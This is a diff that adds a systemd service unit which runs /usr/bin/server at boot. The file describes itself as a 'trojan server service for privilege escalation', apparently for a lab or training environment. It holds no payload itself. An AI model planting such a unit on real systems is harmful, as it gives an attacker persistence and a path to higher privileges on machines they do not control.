@@ -1,0 +1,9 @@
+[Unit]
+Description=This is the trojan server service for privilege escalation.
+ 
+[Service]
+Type=simple
+ExecStart=/usr/bin/server
+ 
+[Install]
+WantedBy=multi-user.target
